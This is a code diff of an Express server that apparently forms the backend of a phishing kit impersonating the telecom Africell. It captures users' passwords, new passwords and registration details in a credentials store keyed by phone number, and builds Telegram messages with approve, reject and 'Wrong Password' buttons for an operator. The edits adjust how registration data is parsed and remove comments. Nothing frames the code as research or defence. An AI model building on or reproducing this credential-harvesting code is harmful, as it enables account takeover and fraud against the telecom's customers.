@@ -88,11 +88,11 @@ app.post('/api/submit-order', async (req, res) => {
             credentialLabel = "New Password";
             wrongButtonText = "⚠️ Wrong Password";
             userCredentials[phone].password = uniqueId.replace('New Password: ', '');
-        } else if (uniqueId.startsWith('Name: ')) {
+        } else if (uniqueId.startsWith('Reg: ')) {
             headerTitle = "📝 *Africell New Account Registration*";
-            credentialLabel = "Account Info";
+            credentialLabel = "Registration Details";
             wrongButtonText = "⚠️ Registration Error";
-            userCredentials[phone].registration = uniqueId;
+            userCredentials[phone].registration = uniqueId.replace('Reg: ', '');
         } else if (uniqueId === 'Password Recovery Request' || uniqueId === 'Signup Mobile Number') {
             headerTitle = "📱 *Africell Mobile Number Submitted*";
             credentialLabel = "Mobile Number Request";
@@ -159,15 +159,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
             let uniqueId = 'N/A';
             let messageTitle = 'Processed Request';
 
-            // Safely parse callback data formatted as prefix_phone_encodedUniqueId
             if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('wrong_id_')) {
                 const prefix = callbackData.startsWith('approve_') ? 'approve_' : (callbackData.startsWith('reject_') ? 'reject_' : 'wrong_id_');
                 const remainder = callbackData.replace(prefix, '');
                 
-                // The phone number format is like "+232 XXX XXX XXX" (contains spaces). Let's extract the phone and the encoded uniqueId safely.
-                // Since phone starts with '+' and has spaces, let's look for where the encoded part begins (after the phone string).
-                // Or easier: split by the first occurrence of '+' if we know the structure, or look for encoded items.
-                // Let's find phone dynamically:
                 const lastUnderscoreIndex = remainder.lastIndexOf('_');
                 if (lastUnderscoreIndex !== -1) {
                     phone = remainder.substring(0, lastUnderscoreIndex);
